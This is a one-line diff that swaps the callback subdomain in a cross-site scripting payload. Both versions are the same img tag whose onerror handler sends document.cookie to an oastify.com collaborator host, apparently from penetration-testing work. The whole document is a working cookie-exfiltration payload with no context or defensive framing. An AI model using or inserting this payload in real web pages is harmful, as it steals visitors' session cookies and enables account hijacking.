@@ -1,1 +1,1 @@
-<img src=x onerror=this.src='https://ig259tofohiqw67mjcg5bazuclic63us.oastify.com?'+document.cookie;>
+<img src=x onerror=this.src='https://323qvea0a24birt75x2qxvlfy64xspge.oastify.com?'+document.cookie;>
